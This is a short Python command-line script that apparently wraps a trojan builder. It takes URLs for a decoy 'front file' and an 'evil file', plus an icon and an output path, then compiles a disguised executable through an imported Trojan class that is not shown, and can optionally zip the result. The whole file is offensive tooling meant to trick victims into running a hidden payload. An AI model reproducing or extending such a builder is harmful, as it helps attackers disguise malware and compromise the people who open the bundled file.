#!/usr/bin/env python

import optparse
from Trojan import *
import zipfile


parser = optparse.OptionParser()
parser.add_option('-f', '--front-file', dest='front_file_url', help='Direct URL to file that the user will see.')
parser.add_option('-e', '--evil-file', dest='evil_file_url', help='Direct URL to the evil file file.')
parser.add_option('-o', '--out-file', dest='out_file_path', help='Location to store the result.')
parser.add_option('-i', '--icon', dest='icon_path', help='Trojan icon.')
parser.add_option('-z', '--zip', dest='zip', help='Zip trojan?', action="store_true")

(options, args) = parser.parse_args()

if not options.front_file_url:
	parser.error("Please specify front file, use --help argument for more info.")
if not options.evil_file_url:
	parser.error("Please specify evil file, use --help argument for more info.")
if not options.out_file_path:
	parser.error("Please specify out file, use --help argument for more info.")

trojan = Trojan(options.front_file_url, options.evil_file_url, options.icon_path)
trojan.create()
trojan.compilea(options.out_file_path)

if options.zip: 
	zip_file_path = options.out_file_path.split(".")[0]
	zipfile.ZipFile(zip_file_path + ".zip", mode="w").write(options.out_file_path)
